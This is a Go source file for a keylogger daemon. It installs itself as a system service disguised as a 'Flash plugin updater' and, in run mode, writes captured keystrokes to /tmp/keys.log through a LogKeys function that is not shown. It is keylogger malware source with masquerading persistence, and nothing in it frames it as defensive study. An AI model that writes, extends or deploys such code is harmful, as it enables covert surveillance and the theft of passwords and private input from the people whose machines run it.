package main

import (
	"log"
	"os"

	"github.com/takama/daemon"
)

func main() {
	cmd := "run"
	if len(os.Args) > 1 {
		cmd = os.Args[1]
	}

	service, err := daemon.New("FlashUpdate", "Flash plugin updater daemon")
	if err != nil {
		log.Fatal(err)
	}

	if cmd == "install" {
		_, err := service.Install()
		if err != nil {
			log.Fatal(err)
		}

		_, err = service.Start()
		if err != nil {
			log.Fatal(err)
		}

		os.Exit(0)

	} else if cmd == "remove" {

		_, err := service.Stop()
		if err != nil {
			log.Fatal(err)
		}

		_, err = service.Remove()
		if err != nil {
			log.Fatal(err)
		}

		os.Exit(0)

	} else if cmd == "help" {
		log.Println("Possible Commands: install remove help run")
	} else {

		out, err := os.OpenFile("/tmp/keys.log", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
		if err != nil {
			log.Fatal(err)
		}
		defer out.Close()
		LogKeys(out)

		os.Exit(0)
	}
}
